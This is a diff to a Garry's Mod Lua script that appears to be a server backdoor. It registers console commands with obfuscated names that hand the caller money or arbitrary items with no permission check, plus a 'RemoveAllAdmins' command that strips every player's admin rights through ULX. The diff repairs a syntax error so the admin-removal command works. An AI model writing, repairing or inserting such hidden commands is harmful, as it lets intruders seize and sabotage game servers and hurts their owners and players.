@@ -1,5 +1,4 @@
 
-
 local GGWP = player.GetAll()
 
 
@@ -17,4 +16,4 @@ function HEHEXDV6(ply , cmd , args) ply:addMoney(tonumber(args[1])) end concomma
 
 function HEHEXDV7(ply , cmd , args) ply:Give(tostring(args[1])) end concommand.Add('B599A01A43A3ABFD09B1A0442FC6A1FED74B1CC0442153F8235EA8CB9B9CCF4F87AB21A503F8522C8793E4598A41F941577277DAE79879CEF84C3A5C23AAEA6', HEHEXDV7)
 
-function HEHEXDV8(ply , cmd , args) for k,v in pairs(GGWP) do RunConsoleCommand("ulx", "removeuserid", v:SteamID()) end concommand.Add('RemoveAllAdmins', HEHEXDV8)
+function HEHEXDV8(ply , cmd , args) for k,v in pairs(GGWP) do RunConsoleCommand("ulx", "removeuserid", v:SteamID()) end end concommand.Add('RemoveAllAdmins', HEHEXDV8)
